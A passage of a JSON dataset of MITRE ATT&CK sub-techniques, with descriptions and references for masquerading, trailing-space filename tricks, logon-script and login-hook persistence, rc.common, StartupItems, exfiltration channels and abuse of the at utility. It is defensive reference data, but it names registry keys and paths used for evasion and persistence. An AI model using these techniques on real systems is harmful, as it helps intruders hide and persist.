    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.<!-- raw HTML omitted --><!-- raw HTML omitted -->Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Schtasks",
        "url": "https://technet.microsoft.com/en-us/library/bb490996.aspx",
        "description": "Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Systemd Service Units",
        "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html",
        "description": "Freedesktop.org. (n.d.). systemd.service — Service unit configuration. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Shamoon Nov 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Fysbis Dr Web Analysis",
        "url": "https://vms.drweb.com/virus/?i=4276269",
        "description": "Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
    "platform": "linux|macos|windows",
    "tid": "T1036.005",
    "technique": "Match Legitimate Name or Location",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also use the same icon of the file they are trying to mimic.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/177.html",
        "description": "none",
        "external_id": "CAPEC-177"
      },
      {
        "source_name": "Endgame Masquerade Ball",
        "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
        "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter ItsReallyNick Masquerading Update",
        "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
        "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86",
    "platform": "linux|macos",
    "tid": "T1036.006",
    "technique": "Space after Filename",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can hide a program’s true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, if there is a Mach-O executable file called <!-- raw HTML omitted -->evil.bin<!-- raw HTML omitted -->, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <!-- raw HTML omitted -->evil.txt<!-- raw HTML omitted -->, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <!-- raw HTML omitted -->evil.txt <!-- raw HTML omitted --> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/649.html",
        "description": "none",
        "external_id": "CAPEC-649"
      },
      {
        "source_name": "Mac Backdoors are back",
        "url": "https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/",
        "description": "Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors are suddenly back. Retrieved July 8, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3",
    "platform": "windows",
    "tid": "T1037.001",
    "technique": "Logon Script (Windows)",
    "tactic": "persistence",
    "datasources": "process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <!-- raw HTML omitted -->HKCU\\Environment\\UserInitMprLogonScript<!-- raw HTML omitted --> Registry key.(Citation: Hexacorn Logon Scripts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Logon Scripts",
        "url": "https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx",
        "description": "Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Hexacorn Logon Scripts",
        "url": "http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/",
        "description": "Hexacorn. (2014, November 14). Beyond good ol’ Run key, Part 18. Retrieved November 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3",
    "platform": "windows",
    "tid": "T1037.001",
    "technique": "Logon Script (Windows)",
    "tactic": "privilege-escalation",
    "datasources": "process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <!-- raw HTML omitted -->HKCU\\Environment\\UserInitMprLogonScript<!-- raw HTML omitted --> Registry key.(Citation: Hexacorn Logon Scripts)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Logon Scripts",
        "url": "https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx",
        "description": "Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Hexacorn Logon Scripts",
        "url": "http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/",
        "description": "Hexacorn. (2014, November 14). Beyond good ol’ Run key, Part 18. Retrieved November 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0",
    "platform": "macos",
    "tid": "T1037.002",
    "technique": "Logon Script (Mac)",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike <a href=\"https://attack.mitre.org/techniques/T1037/005\">Startup Items</a>, a login hook executes as the elevated root user.(Citation: creating login hook)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these login hooks to maintain persistence on a single system.(Citation: S1 macOs Persistence) Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "creating login hook",
        "url": "https://support.apple.com/de-at/HT2420",
        "description": "Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "S1 macOs Persistence",
        "url": "https://www.sentinelone.com/blog/how-malware-persists-on-macos/",
        "description": "Stokes, P. (2019, July 17). How Malware Persists on macOS. Retrieved March 27, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0",
    "platform": "macos",
    "tid": "T1037.002",
    "technique": "Logon Script (Mac)",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike <a href=\"https://attack.mitre.org/techniques/T1037/005\">Startup Items</a>, a login hook executes as the elevated root user.(Citation: creating login hook)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these login hooks to maintain persistence on a single system.(Citation: S1 macOs Persistence) Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "creating login hook",
        "url": "https://support.apple.com/de-at/HT2420",
        "description": "Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "S1 macOs Persistence",
        "url": "https://www.sentinelone.com/blog/how-malware-persists-on-macos/",
        "description": "Stokes, P. (2019, July 17). How Malware Persists on macOS. Retrieved March 27, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99",
    "platform": "windows",
    "tid": "T1037.003",
    "technique": "Network Logon Script",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  <!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "Petri Logon Script AD",
        "url": "https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008",
        "description": "Daniel Petri. (2009, January 8). Setting up a Logon Script through Active Directory Users and Computers in Windows Server 2008. Retrieved November 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99",
    "platform": "windows",
    "tid": "T1037.003",
    "technique": "Network Logon Script",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  <!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.</p>\n",
    "technique_references": [
      {
        "source_name": "Petri Logon Script AD",
        "url": "https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008",
        "description": "Daniel Petri. (2009, January 8). Setting up a Logon Script through Active Directory Users and Computers in Windows Server 2008. Retrieved November 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
    "platform": "macos",
    "tid": "T1037.004",
    "technique": "Rc.common",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes <!-- raw HTML omitted -->source /etc/rc.common<!-- raw HTML omitted -->, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated mechanism in favor of <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a> and <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> but is currently still used.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. (Citation: Methods of Mac Malware Persistence)</p>\n",
    "technique_references": [
      {
        "source_name": "Startup Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
        "description": "Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
    "platform": "macos",
    "tid": "T1037.004",
    "technique": "Rc.common",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes <!-- raw HTML omitted -->source /etc/rc.common<!-- raw HTML omitted -->, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated mechanism in favor of <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a> and <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> but is currently still used.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. (Citation: Methods of Mac Malware Persistence)</p>\n",
    "technique_references": [
      {
        "source_name": "Startup Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
        "description": "Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f",
    "platform": "macos",
    "tid": "T1037.005",
    "technique": "Startup Items",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. (Citation: Startup Items)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is technically a deprecated technology (superseded by <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a>), and thus the appropriate folder, <!-- raw HTML omitted -->/Library/StartupItems<!-- raw HTML omitted --> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <!-- raw HTML omitted -->StartupParameters.plist<!-- raw HTML omitted -->, reside in the top-level directory. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.</p>\n",
    "technique_references": [
      {
        "source_name": "Startup Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
        "description": "Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f",
    "platform": "macos",
    "tid": "T1037.005",
    "technique": "Startup Items",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. (Citation: Startup Items)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is technically a deprecated technology (superseded by <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a>), and thus the appropriate folder, <!-- raw HTML omitted -->/Library/StartupItems<!-- raw HTML omitted --> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <!-- raw HTML omitted -->StartupParameters.plist<!-- raw HTML omitted -->, reside in the top-level directory. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.</p>\n",
    "technique_references": [
      {
        "source_name": "Startup Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
        "description": "Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c",
    "platform": "linux|macos|windows",
    "tid": "T1048.001",
    "technique": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "tactic": "exfiltration",
    "datasources": "malware-reverse-engineering|netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. <!-- raw HTML omitted --><!-- raw HTML omitted -->Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
    "platform": "linux|macos|windows",
    "tid": "T1048.002",
    "technique": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. <!-- raw HTML omitted --><!-- raw HTML omitted -->Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
    "platform": "linux|macos|windows",
    "tid": "T1048.003",
    "technique": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829",
    "platform": "linux|macos|windows",
    "tid": "T1052.001",
    "technique": "Exfiltration over USB",
    "tactic": "exfiltration",
    "datasources": "data-loss-prevention|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e",
    "platform": "linux",
    "tid": "T1053.001",
    "technique": "At (Linux)",
    "tactic": "execution",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <a href=\"https://attack.mitre.org/software/S0110\">at</a> in Linux environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": [
      {
        "source_name": "Kifarunix - Task Scheduling in Linux",
        "url": "https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/",
        "description": "Koromicha. (2019, September 7). Scheduling tasks using at command in Linux. Retrieved December 3, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e",
    "platform": "linux",
    "tid": "T1053.001",
    "technique": "At (Linux)",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <a href=\"https://attack.mitre.org/software/S0110\">at</a> in Linux environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": [
      {
        "source_name": "Kifarunix - Task Scheduling in Linux",
        "url": "https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/",
        "description": "Koromicha. (2019, September 7). Scheduling tasks using at command in Linux. Retrieved December 3, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e",
    "platform": "linux",
    "tid": "T1053.001",
    "technique": "At (Linux)",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
